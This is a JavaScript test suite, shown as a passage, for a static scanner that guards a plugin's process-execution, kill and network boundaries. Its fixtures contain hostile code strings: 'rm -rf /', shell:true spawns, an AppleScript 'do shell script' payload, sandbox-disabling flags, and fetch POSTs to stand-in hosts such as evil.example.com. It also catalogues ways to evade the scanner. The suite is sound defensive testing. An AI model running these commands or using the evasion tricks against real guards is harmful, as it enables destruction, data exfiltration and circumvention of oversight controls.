// ADR-0035 §4 active-execution boundary guard — plugin-shape test.
//
// Three layers:
//   (a) scanner unit tests on adversarial fixtures (the tokenizer + gates bite
//       on real violations and stay quiet on look-alikes);
//   (b) conformance: the real plugins/runtime/scripts/**/*.mjs surface produces
//       ZERO violations against the registry (and a new unregistered executor
//       would fail this, enforcing the ADR-0035 §5 add-gate);
//   (c) negative-conformance + registry-drift: the gate is proven non-vacuous,
//       and the registry never drifts looser than the code it describes.

import { describe, it } from 'node:test';
import { ok, strictEqual, deepStrictEqual } from 'node:assert/strict';
import { readFile, readdir } from 'node:fs/promises';
import { resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

import * as registry from './runtime-executor-registry.mjs';
import {
  stripComments, scanFile, auditScripts, parseArgvArray, normalizeElement, matchVerbPath,
  validatePinnedHttpsRequest, validateOpenFlags, findImports,
} from './runtime-executor-scan.mjs';

const REPO_ROOT = resolve(fileURLToPath(import.meta.url), '../../..');
const RUNTIME_SCRIPTS = resolve(REPO_ROOT, 'plugins/runtime/scripts');

async function listRuntimeScripts(dir = RUNTIME_SCRIPTS, prefix = '') {
  const entries = await readdir(dir, { withFileTypes: true });
  const out = [];
  for (const e of entries) {
    const rel = prefix ? `${prefix}/${e.name}` : e.name;
    if (e.isDirectory()) out.push(...(await listRuntimeScripts(resolve(dir, e.name), rel)));
    else if (e.name.endsWith('.mjs')) out.push({ fileName: e.name, rel, path: resolve(dir, e.name) });
  }
  return out;
}

function scan(fileName, source) {
  return scanFile({ fileName, source, registry }).violations;
}
const rules = (vs) => vs.map((v) => v.rule);

// ---------------------------------------------------------------------------
// (a) Tokenizer
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — tokenizer (stripComments)', () => {
  it('removes line and block comments', () => {
    const code = stripComments(`const a = 1; // shell: true\n/* shell: true */ const b = 2;`);
    ok(!/shell:\s*true/.test(code), 'comment shell:true must be stripped');
    ok(code.includes('const a'));
    ok(code.includes('const b'));
  });

  it('preserves string literals (argv hazards live in strings)', () => {
    const code = stripComments(`const x = ['-c', 'login'];`);
    ok(code.includes("'-c'"), 'string content kept');
    ok(code.includes("'login'"));
  });

  it('preserves a regex containing \\/\\/ without spawning a false comment', () => {
    // compat.mjs: /^https?:\/\//i.test(url) — the trailing \/\/ must not be read
    // as a line comment that eats the rest of the line.
    const src = `if (!/^https?:\\/\\//i.test(url)) { THROW_MARKER(); }`;
    const code = stripComments(src);
    ok(code.includes('THROW_MARKER'), 'code after a //-bearing regex survives');
  });

  it('does not treat division as a regex', () => {
    const code = stripComments(`const ms = total / 1000; const n = a / b; KEEP();`);
    ok(code.includes('KEEP()'));
    ok(code.includes('/ 1000'));
  });
});

// ---------------------------------------------------------------------------
// (a) Argv parsing
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — argv parsing', () => {
  it('parses a literal string array', () => {
    deepStrictEqual(parseArgvArray(`['plugin', 'list']`), { kind: 'literal', tokens: ['plugin', 'list'] });
  });
  it('collapses template ${...} to *', () => {
    deepStrictEqual(parseArgvArray('[`${name}@agentic-plugins`]'), { kind: 'literal', tokens: ['*@agentic-plugins'] });
  });
  it('maps a variable target element to * but keeps a spread dynamic', () => {
    strictEqual(parseArgvArray('userArgs').kind, 'not-array'); // not an array literal
    strictEqual(parseArgvArray('[...userArgs]').kind, 'dynamic'); // spread changes arity
    // a literal verb + variable target stays checkable (target → '*')
    deepStrictEqual(parseArgvArray("['plugin', action]"), { kind: 'literal', tokens: ['plugin', '*'] });
    deepStrictEqual(parseArgvArray("['init', '-q', '-b', spec.branch]"), { kind: 'literal', tokens: ['init', '-q', '-b', '*'] });
  });
  it('a variable VERB (not just target) fails the allowlist', () => {
    // ['plugin', action] → ['plugin', '*']; '*' never equals a required literal verb
    ok(rules(scan('settings.mjs', `commandSpec('codex', ['plugin', action, name]);`)).includes('argv-verb-gate'));
  });
  it('verb-path matching: * one token, ... rest', () => {
    ok(matchVerbPath(['rev-parse', 'HEAD'], ['rev-parse', '...'], registry.DANGEROUS_ARGV_TOKENS));
    ok(matchVerbPath(['login', 'status'], ['login', 'status'], registry.DANGEROUS_ARGV_TOKENS));
    ok(!matchVerbPath(['login'], ['login', 'status'], registry.DANGEROUS_ARGV_TOKENS));
  });
});

// ---------------------------------------------------------------------------
// (a) Gates bite on violations
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — gates catch real violations', () => {
  it('shell:true in code → shell-gate', () => {
    ok(rules(scan('x.mjs', `spawn(cmd, args, { shell: true });`)).includes('shell-gate'));
  });
  it('shell:true via an indirect options variable → shell-gate', () => {
    ok(rules(scan('x.mjs', `const opts = { shell: true }; spawn(c, a, opts);`)).includes('shell-gate'));
  });
  it('shell:true inside a comment → NO finding', () => {
    deepStrictEqual(scan('x.mjs', `// spawn(c, a, { shell: true })\nconst z = 1;`), []);
  });
  it('shell binary + -c → shell-gate (and command-gate)', () => {
    const r = rules(scan('doctor.mjs', `spawn('sh', ['-c', userInput]);`));
    ok(r.includes('shell-gate') || r.includes('command-gate'), `got ${r}`);
  });
  it('bare codex login (auth mutation) → argv-verb-gate', () => {
    ok(rules(scan('doctor.mjs', `runner('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('codex login status (read probe) → NO finding', () => {
    deepStrictEqual(scan('doctor.mjs', `runner('codex', ['login', 'status']);`), []);
  });
  it('codex exec --sandbox danger-full-access → argv-verb-gate', () => {
    ok(rules(scan('doctor.mjs', `runner('codex', ['exec', '--sandbox', 'danger-full-access']);`)).includes('argv-verb-gate'));
  });
  it('codex hooks trust (trust mutation) → argv-verb-gate', () => {
    ok(rules(scan('doctor.mjs', `runner('codex', ['hooks', 'trust']);`)).includes('argv-verb-gate'));
  });
  it('claude with fully dynamic argv → argv-unresolved', () => {
    ok(rules(scan('doctor.mjs', `runner('claude', userArgs);`)).includes('argv-unresolved'));
  });
  it('machine-probe inspectCli inline probe argv IS validated (not dead config)', () => {
    // inspectCli was extracted from doctor.mjs to lib/machine-probe.mjs (the
    // machine-bootstrap probe seam); the PROBE_CONFIGS recognition moved with it.
    // a tampered inline probe (auth mutation) must be caught …
    ok(rules(scan('machine-probe.mjs', `inspectCli('codex', { authArgs: ['login'], runner, cwd });`)).includes('argv-verb-gate'));
    // … while the real read probes pass
    deepStrictEqual(scan('machine-probe.mjs', `inspectCli('codex', { authArgs: ['login', 'status'], versionArgs: ['--version'], runner, cwd });`), []);
  });
  it('non-allowlisted command literal → command-gate', () => {
    ok(rules(scan('doctor.mjs', `runner('rm', ['-rf', '/']);`)).includes('command-gate'));
  });
  it('git push (not in git allowlist) → argv-verb-gate', () => {
    ok(rules(scan('migrate-workflow-storage.mjs', `runner('git', ['push', 'origin']);`)).includes('argv-verb-gate'));
  });
  it('git worktree remove (destructive) → argv-verb-gate', () => {
    ok(rules(scan('worktree.mjs', `runGit({ args: ['worktree', 'remove', path] });`)).includes('argv-verb-gate'));
  });
  it('plugin remove (destructive verb, no template) → argv-verb-gate', () => {
    ok(rules(scan('settings.mjs', `commandSpec('codex', ['plugin', 'remove', name]);`)).includes('argv-verb-gate'));
  });
  it('claude plugin uninstall WITHOUT @agentic-plugins suffix → argv-verb-gate', () => {
    ok(rules(scan('settings.mjs', `commandSpec('claude', ['plugin', 'uninstall', 'someplugin']);`)).includes('argv-verb-gate'));
  });
  it('claude plugin uninstall *@agentic-plugins in plugin-management-plan.mjs → NO finding (the one §4 exception)', () => {
    deepStrictEqual(scan('plugin-management-plan.mjs', "commandSpec('claude', ['plugin', 'uninstall', `${plugin}@agentic-plugins`]);"), []);
  });
  it('that same retired-cleanup uninstall in a DIFFERENT file (now incl. settings.mjs, which no longer owns it) → argv-verb-gate', () => {
    ok(rules(scan('settings.mjs', "commandSpec('claude', ['plugin', 'uninstall', `${plugin}@agentic-plugins`]);")).includes('argv-verb-gate'));
    ok(rules(scan('doctor.mjs', "commandSpec('claude', ['plugin', 'uninstall', `${plugin}@agentic-plugins`]);")).includes('argv-verb-gate'));
  });
  it('process.kill → kill-gate', () => {
    ok(rules(scan('doctor.mjs', `process.kill(pid, 'SIGTERM');`)).includes('kill-gate'));
  });
  // The signal-0 liveness exemption (ALLOWED_PID_LIVENESS_SITES). Signal 0 sends
  // nothing; every neighbouring shape that COULD signal still fails, in the very
  // same file — the exemption is a form, not a licence for the file.
  it('process.kill(pid, 0) in the registered liveness sites → NO finding', () => {
    deepStrictEqual(scan('bootstrap-artifacts.mjs', `process.kill(pid, 0);`), []);
    // doctor.mjs joined the list for the egress intent-WAL blocker wording
    // (G1 / ADR-0048 residual (a)) — a liveness READ that never takes over.
    deepStrictEqual(scan('doctor.mjs', `process.kill(pid, 0);`), []);
  });
  it('that same signal-0 probe in an UNREGISTERED file → kill-gate', () => {
    // Two unregistered files, so this keeps proving the exemption is per-file
    // rather than global even as the registered set grows.
    ok(rules(scan('settings.mjs', `process.kill(pid, 0);`)).includes('kill-gate'));
    ok(rules(scan('consensus.mjs', `process.kill(pid, 0);`)).includes('kill-gate'));
  });
  it('a real signal in the liveness site → kill-gate (the exemption is signal-0 only)', () => {
    ok(rules(scan('bootstrap-artifacts.mjs', `process.kill(pid, 'SIGTERM');`)).includes('kill-gate'));
    ok(rules(scan('bootstrap-artifacts.mjs', `process.kill(pid, 9);`)).includes('kill-gate'));
    ok(rules(scan('bootstrap-artifacts.mjs', `process.kill(pid);`)).includes('kill-gate'));
  });
  it('a VARIABLE signal in the liveness site → kill-gate (it could hold SIGKILL)', () => {
    ok(rules(scan('bootstrap-artifacts.mjs', `process.kill(pid, sig);`)).includes('kill-gate'));
    ok(rules(scan('bootstrap-artifacts.mjs', `process.kill(pid, zero);`)).includes('kill-gate'));
  });
  it('the liveness site is not exempt from the OTHER kill rules', () => {
    ok(rules(scan('bootstrap-artifacts.mjs', `child.kill('SIGTERM');`)).includes('kill-gate'));
    ok(rules(scan('bootstrap-artifacts.mjs', `const s = 'SIGKILL';`)).includes('kill-gate'));
  });
  it('a second process.kill alongside the probe is still caught', () => {
    // The exemption must not blanket the file: one legal probe plus one illegal
    // kill is one violation, not zero.
    ok(rules(scan('bootstrap-artifacts.mjs', `process.kill(pid, 0); process.kill(other, 'SIGTERM');`)).includes('kill-gate'));
  });
  it('child.kill in doctor.mjs (own-child timeout) → NO finding', () => {
    deepStrictEqual(scan('doctor.mjs', `child.kill('SIGTERM');`), []);
  });
  it('child.kill OUTSIDE doctor.mjs → kill-gate', () => {
    ok(rules(scan('consensus.mjs', `child.kill('SIGTERM');`)).includes('kill-gate'));
  });
  it('SIGKILL anywhere → kill-gate', () => {
    ok(rules(scan('doctor.mjs', `child.kill('SIGKILL');`)).includes('kill-gate'));
  });
  it('capability import in a non-importer file → import-gate', () => {
    ok(rules(scan('worktree.mjs', `import { spawn } from 'node:child_process';`)).includes('import-gate'));
  });
  it('namespace capability import in a non-importer file → import-gate', () => {
    ok(rules(scan('worktree.mjs', `import * as cp from 'node:child_process';`)).includes('import-gate'));
  });
  it('dynamic import of child_process → import-gate', () => {
    ok(rules(scan('x.mjs', `const cp = await import('node:child_process');`)).includes('import-gate'));
  });
});

// ---------------------------------------------------------------------------
// (a) Look-alikes do NOT false-positive
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — look-alikes stay quiet', () => {
  it('Map.get / byDate.get is not a network call', () => {
    deepStrictEqual(scan('cutover-audit.mjs', `const v = byDate.get(date); const w = map.get(key);`), []);
  });
  it('prose mentioning remove/--sandbox/login is not argv', () => {
    const src = `const msg = 'remove it with codex plugin remove'; const f = /--sandbox\\b/.test(t);`;
    deepStrictEqual(scan('doctor.mjs', src), []);
  });
  it('a field named plugin_remove_command is not a destructive verb', () => {
    deepStrictEqual(scan('doctor.mjs', `const x = { plugin_remove_command: true, sandbox_flag: false };`), []);
  });
  it('namespace .get on a non-network module (cache.get) is not an exec/network call', () => {
    deepStrictEqual(scan('cutover-audit.mjs', `import * as cache from './cache.mjs'; const v = cache.get(key);`), []);
  });
});

// ---------------------------------------------------------------------------
// (a) Bypass vectors closed (Codex working-tree review hardening)
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — bypass vectors are closed', () => {
  it('wrapper alias: const r = runCommand; r(...) → caught', () => {
    ok(rules(scan('doctor.mjs', `const r = runCommand; r('codex', ['login']);`)).length > 0);
  });
  it('namespace member call: doctor.runCommand(...) → caught', () => {
    ok(rules(scan('x.mjs', `import * as doctor from './doctor.mjs'; doctor.runCommand('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('imported primitive alias: spawn as run → caught', () => {
    ok(rules(scan('x.mjs', `import { spawn as run } from 'node:child_process'; run('rm', ['-rf', '/']);`)).includes('command-gate'));
  });
  it('namespace primitive: cp.spawn(...) → caught', () => {
    const r = rules(scan('x.mjs', `import * as cp from 'node:child_process'; cp.spawn('rm', ['-rf', '/']);`));
    ok(r.includes('import-gate') && r.includes('command-gate'));
  });
  it('forwarding exact-match: runner("git", ["push", ...args]) → caught', () => {
    ok(rules(scan('worktree.mjs', `runner('git', ['push', ...args], { cwd });`)).length > 0);
  });
  it('forwarding exact-match: execFile("git", ["-C", repoRoot, "push", ...args]) → caught', () => {
    ok(rules(scan('source-snapshot.mjs', `execFile('git', ['-C', repoRoot, 'push', ...args], cb);`)).length > 0);
  });
  it('the real forwarding shapes stay exempt (scope-anchored to the wrapper body)', () => {
    deepStrictEqual(scan('worktree.mjs', `async function runGit({ repoRoot, runner, timeoutMs, args }) { return runner('git', args, { cwd: repoRoot, timeoutMs }); }`), []);
    deepStrictEqual(scan('source-snapshot.mjs', `function execGit(repoRoot, args) { return execFile('git', ['-C', repoRoot, ...args], { timeout: GIT_TIMEOUT_MS }, cb); }`), []);
  });
  it('fake .kill() in doctor.mjs (not the own-child site) → kill-gate', () => {
    ok(rules(scan('doctor.mjs', `const victim = { kill() {} }; victim.kill('SIGTERM');`)).includes('kill-gate'));
  });
  it('network .request() in compat → network-gate', () => {
    ok(rules(scan('compat.mjs', `import https from 'node:https'; const c = https; c.request('https://x', { method: 'POST' });`)).includes('network-gate'));
  });
  it('tokenizer: code after a //-bearing regex is still scanned', () => {
    // a forbidden call hidden after `return /[//]/.test(x)` must NOT be masked
    ok(rules(scan('doctor.mjs', `function f(){ return /[//]/.test(x); runner('codex', ['login']); }`)).includes('argv-verb-gate'));
  });
  it('dynamic import with a non-literal specifier → import-gate', () => {
    ok(rules(scan('x.mjs', `const cp = await import(process.env.RUNTIME_MODULE);`)).includes('import-gate'));
  });
  it('re-export from a capability module → import-gate', () => {
    ok(rules(scan('x.mjs', `export { spawn as run } from 'node:child_process';`)).includes('import-gate'));
  });
  it('computed shell key { ["shell"]: true } → shell-gate', () => {
    ok(rules(scan('doctor.mjs', `spawn('git', ['status'], { ['shell']: true });`)).includes('shell-gate'));
  });
  // Second adversarial pass
  it('forwarding is exact-SITE: const args = ["push"]; runner("git", args) → caught', () => {
    ok(rules(scan('worktree.mjs', `const args = ['push', 'origin']; runner('git', args, { cwd });`)).length > 0);
    ok(rules(scan('source-snapshot.mjs', `const args = ['push']; execFile('git', ['-C', repoRoot, ...args], cb);`)).length > 0);
  });
  it('dynamic projection with an INLINE literal argv is still verb-checked', () => {
    ok(rules(scan('settings.mjs', `runner(plan.argv.command, ['plugin', 'remove', name], { cwd });`)).includes('argv-verb-gate'));
  });
  it('reassignment alias: let r; r = runCommand; r(...) → caught', () => {
    ok(rules(scan('doctor.mjs', `let r; r = runCommand; r('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('destructuring alias: const { runCommand: r } = doctor → caught', () => {
    ok(rules(scan('x.mjs', `import * as doctor from './doctor.mjs'; const { runCommand: r } = doctor; r('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('dynamic import via string concat → import-gate', () => {
    ok(rules(scan('x.mjs', `const cp = await import('node:' + 'child_process'); cp.spawn('rm', ['-rf', '/']);`)).includes('import-gate'));
  });
  it('network method alias: const req = https.request → network-gate', () => {
    ok(rules(scan('compat.mjs', `import https from 'node:https'; const req = https.request; req('https://x', { method: 'POST' });`)).includes('network-gate'));
  });
  // Third adversarial pass
  it('parenthesized aliases (const r = (runCommand), r = (doctor.runCommand)) → caught', () => {
    ok(rules(scan('doctor.mjs', `const r = (runCommand); r('codex', ['login']);`)).includes('argv-verb-gate'));
    ok(rules(scan('doctor.mjs', `let r; r = (runCommand); r('codex', ['login']);`)).includes('argv-verb-gate'));
    ok(rules(scan('x.mjs', `import * as doctor from './doctor.mjs'; const r = (doctor.runCommand); r('codex', ['login']);`)).includes('argv-verb-gate'));
  });
  it('projection with a local-const literal argv → verb-checked', () => {
    ok(rules(scan('settings.mjs', `const argv = ['plugin', 'remove', name]; runner(plan.argv.command, argv, { cwd });`)).includes('argv-verb-gate'));
  });
  it('network destructuring: const { request } = https → network-gate', () => {
    ok(rules(scan('compat.mjs', `import https from 'node:https'; const { request } = https; request('https://x', { method: 'POST' });`)).includes('network-gate'));
  });
  it('namespace primitive in a registered importer: cp.execFile in doctor (spawn-only) → primitive-gate', () => {
    ok(rules(scan('doctor.mjs', `import * as cp from 'node:child_process'; cp.execFile('git', ['status']);`)).includes('primitive-gate'));
  });
  it('no false positive: unrelated .request property / unrelated const args', () => {
    deepStrictEqual(scan('compat.mjs', `const x = { request: 1 }; doSomething(x.request);`), []);
    deepStrictEqual(scan('worktree.mjs', `const args = ['status', '--short']; somethingElse(args);`), []);
  });
});

// ---------------------------------------------------------------------------
// (b) Conformance — real runtime surface is clean
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — conformance over plugins/runtime/scripts', () => {
  it('runtime scripts have unique basenames (registry is basename-keyed)', async () => {
    // The registry keys on basename and the glob is recursive; a nested
    // plugins/runtime/scripts/subdir/doctor.mjs must not silently inherit
    // doctor.mjs privileges. Assert no duplicate basenames (Codex review MAJOR #5).
    const scripts = await listRuntimeScripts();
    const seen = new Map();
    for (const s of scripts) {
      ok(!seen.has(s.fileName), `duplicate basename ${s.fileName} (${s.rel} vs ${seen.get(s.fileName)}) — registry keying is ambiguous`);
      seen.set(s.fileName, s.rel);
    }
  });

  it('every runtime script passes the registry (0 violations)', async () => {
    const scripts = await listRuntimeScripts();
    ok(scripts.length >= 10, `expected the runtime script surface, found ${scripts.length}`);
    const files = await Promise.all(scripts.map(async (s) => ({ fileName: s.fileName, source: await readFile(s.path, 'utf-8') })));
    const { violations } = auditScripts({ files, registry });
    if (violations.length) {
      const lines = violations.map((v) => `  [${v.rule}] ${v.file}: ${v.detail}`).join('\n');
      throw new Error(`runtime executor conformance failed (${violations.length}):\n${lines}`);
    }
    strictEqual(violations.length, 0);
  });
});

// ---------------------------------------------------------------------------
// (c) Negative-conformance — the gate is non-vacuous
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — negative conformance (gate bites)', () => {
  it('a synthetic unregistered executor file is rejected', () => {
    const malicious = [
      `import { spawn } from 'node:child_process';`,
      `export function evil(userCmd, userArgs) {`,
      `  return spawn(userCmd, userArgs, { shell: true });`,
      `}`,
      `export function nuke() { spawn('codex', ['login']); }`,
    ].join('\n');
    const r = rules(scan('newly-added-executor.mjs', malicious));
    ok(r.includes('import-gate'), `expected import-gate, got ${r}`);
    ok(r.includes('shell-gate'), `expected shell-gate, got ${r}`);
    ok(r.includes('command-gate') || r.includes('argv-verb-gate'), `expected command/argv finding, got ${r}`);
  });

  it('injecting a forbidden call into a real file is caught', async () => {
    const doctorSrc = await readFile(resolve(RUNTIME_SCRIPTS, 'doctor.mjs'), 'utf-8');
    const injected = `${doctorSrc}\nfunction __evil() { runner('codex', ['login']); process.kill(1); }\n`;
    const r = rules(scan('doctor.mjs', injected));
    ok(r.includes('argv-verb-gate'), `expected argv-verb-gate, got ${r}`);
    ok(r.includes('kill-gate'), `expected kill-gate, got ${r}`);
  });
});

// ---------------------------------------------------------------------------
// (c) Negative-conformance — ADR-0040 §2 notification emitter (osascript)
// ---------------------------------------------------------------------------

describe('ADR-0035 §4 guard — ADR-0040 notification dispatch (per-source negative conformance)', () => {
  // Mirrors notify.mjs dispatchOsascript: named spawn import + the
  // spawnImpl-injectable alias the scanner must follow.
  const PRELUDE = `import { spawn } from 'node:child_process';\nconst doSpawn = spawnImpl ?? spawn;\n`;
  const FIXED_ARGV = `['-e', 'on run argv', '-e', 'display notification (item 2 of argv) with title (item 1 of argv)', '-e', 'end run', title, body]`;
  const OPTS = `{ stdio: 'ignore', detached: true, env: spawnEnv }`;

  it('the exact fixed template in notify.mjs → NO finding', () => {
    deepStrictEqual(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, ${OPTS});`), []);
  });

  it('payload interpolated INTO the -e program (template literal) → argv-verb-gate', () => {
    // `display notification "${body}" ...` normalizes its program token to
    // contain '*', which cannot equal the pinned literal program.
    const argv = "['-e', 'on run argv', '-e', `display notification \"${body}\" with title (item 1 of argv)`, '-e', 'end run', title]";
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${argv}, ${OPTS});`)).includes('argv-verb-gate'));
  });

  it('a DIFFERENT AppleScript program (do shell script) → argv-verb-gate', () => {
    const argv = "['-e', 'on run argv', '-e', 'do shell script (item 1 of argv)', '-e', 'end run', title, body]";
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${argv}, ${OPTS});`)).includes('argv-verb-gate'));
  });

  it('an arity change (extra trailing argv) → argv-verb-gate', () => {
    const argv = FIXED_ARGV.replace(', body]', ', body, extra]');
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${argv}, ${OPTS});`)).includes('argv-verb-gate'));
  });

  it('a variable program (["-e", userProgram, ...]) → argv-verb-gate', () => {
    const argv = "['-e', userProgram, title]";
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${argv}, ${OPTS});`)).includes('argv-verb-gate'));
  });

  it('a fully dynamic argv (spread) → argv-unresolved', () => {
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', [...userArgs], ${OPTS});`)).includes('argv-unresolved'));
  });

  it('the same fixed template in a NON-importer runtime file → import-gate', () => {
    ok(rules(scan('cutover-audit.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, ${OPTS});`)).includes('import-gate'));
  });

  it('a bare `osascript` (PATH-resolved, not the pinned absolute path) → command-gate', () => {
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('osascript', ${FIXED_ARGV}, ${OPTS});`)).includes('command-gate'));
  });

  it('shell:true on the osascript spawn → shell-gate', () => {
    ok(rules(scan('notify.mjs', `${PRELUDE}doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, { shell: true });`)).includes('shell-gate'));
  });

  it('an unref-dodging kill on the notify child → kill-gate', () => {
    ok(rules(scan('notify.mjs', `${PRELUDE}const child = doSpawn('/usr/bin/osascript', ${FIXED_ARGV}, ${OPTS}); child.kill('SIGTERM');`)).includes('kill-gate'));
  });
});

// ---------------------------------------------------------------------------
// (c) Negative-conformance — ADR-0041 §2d global fetch egress (KEYSTONE gate)
// ---------------------------------------------------------------------------

describe('ADR-0041 §2d guard — global fetch egress (per-source negative conformance)', () => {
  // The ORIGINAL E1 egress shape (a direct global fetch to the fixed Telegram host,
  // POST, redirect:'error', a bounded AbortSignal timeout). The [impl-transport]
  // slice swapped the transport to an in-process node:https request (ADR-0041 §2d)
  // and emptied GLOBAL_FETCH_USERS, so this fetch shape is NO LONGER registered in
  // notify.mjs — the gate now rejects it there too (see the node:https block below
  // for the current pinned transport).
  const PINNED = "fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000), body: payload })";

  it('the former pinned Telegram fetch in notify.mjs is now rejected (transport swapped to node:https) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', `const token = 't'; const payload = 'x'; ${PINNED};`)).includes('global-fetch-gate'));
  });

  it('global fetch in a NON-registered runtime file → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', `${PINNED};`)).includes('global-fetch-gate'));
  });

  it('globalThis.fetch in a capability-importer file (not fetch-registered) → global-fetch-gate', () => {
    ok(rules(scan('doctor.mjs', `globalThis.fetch('https://api.telegram.org/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });`)).includes('global-fetch-gate'));
  });

  it('a non-POST method → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'GET', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
  });

  it('a non-allowlisted origin → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://evil.example.com/send', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
  });

  it('a userinfo-trick lookalike origin (api.telegram.org@evil.com) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org@evil.com/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) })")).includes('global-fetch-gate'));
  });

  it('a missing timeout → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error' })")).includes('global-fetch-gate'));
  });

  it('redirect-following (no redirect:error) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
  });

  it('a non-literal (variable) URL → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(url, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5000) })")).includes('global-fetch-gate'));
  });

  it('an aliased fetch in notify.mjs (defeats static validation) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "const f = fetch; f(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });

  it('a destructured fetch from globalThis → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "const { fetch } = globalThis;")).includes('global-fetch-gate'));
  });

  // Codex-review CRITICAL bypasses — the fail-closed redesign must now catch
  // every indirection form and every validation dodge.
  it('optional-chaining call fetch?.() in a non-registered file → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "fetch?.('https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it("computed access globalThis['fetch']() → global-fetch-gate", () => {
    ok(rules(scan('cutover-audit.mjs', "globalThis['fetch']('https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it("Reflect.get(globalThis,'fetch')() → global-fetch-gate", () => {
    ok(rules(scan('cutover-audit.mjs', "Reflect.get(globalThis, 'fetch')('https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it('fetch.call/.apply → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "fetch.call(globalThis, 'https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it('a globalThis alias then member call (const g = globalThis; g.fetch()) → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', "const g = globalThis; g.fetch('https://evil.example/x', opts);")).includes('global-fetch-gate'));
  });
  it('a tagged-template fetch`...` → global-fetch-gate', () => {
    ok(rules(scan('cutover-audit.mjs', 'fetch`https://evil.example/x`;')).includes('global-fetch-gate'));
  });
  it('URL via && / concatenation defeating the pinned literal → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot' && 'https://evil.example/x', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });
  it('a real GET init hidden behind a decoy 3rd arg (fetch(url, undefined, {pinned})) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, undefined, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });
  it('pinned tokens buried in a nested string, real init is GET/redirect-follow → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'GET', redirect: 'follow', note: \"method:'POST' redirect:'error' AbortSignal.timeout(\" });")).includes('global-fetch-gate'));
  });
  it('a local shadow wrapper that egresses elsewhere but looks pinned → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "const fetch = (u, o) => globalThis['fetch']('https://evil.example/x', o); fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });
  it('the origin-only-but-wrong-endpoint (/deleteWebhook) → global-fetch-gate', () => {
    ok(rules(scan('notify.mjs', "fetch('https://api.telegram.org/bot0/deleteWebhook', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) });")).includes('global-fetch-gate'));
  });

  // Codex re-review (round 2) — the fail-closed redesign's own new holes.
  it('a pinned-shaped decoy fetch( in a string cannot cancel a real alias → global-fetch-gate', () => {
    const src = "const f = fetch;\n"
      + "const decoy = \"fetch('https://api.telegram.org/bot0/sendMessage', { method: 'POST', redirect: 'error', signal: AbortSignal.timeout(5) })\";\n"
      + "f('https://evil.example/x', { method: 'GET' });";
    ok(rules(scan('notify.mjs', src)).includes('global-fetch-gate'));
  });
  it("Reflect['get'](globalThis,'fetch') → global-fetch-gate", () => {
    ok(rules(scan('cutover-audit.mjs', "Reflect['get'](globalThis, 'fetch')('https://evil.example/x', {});")).includes('global-fetch-gate'));
  });
  it('Object.getOwnPropertyDescriptor(globalThis, "fetch").value → global-fetch-gate', () => {
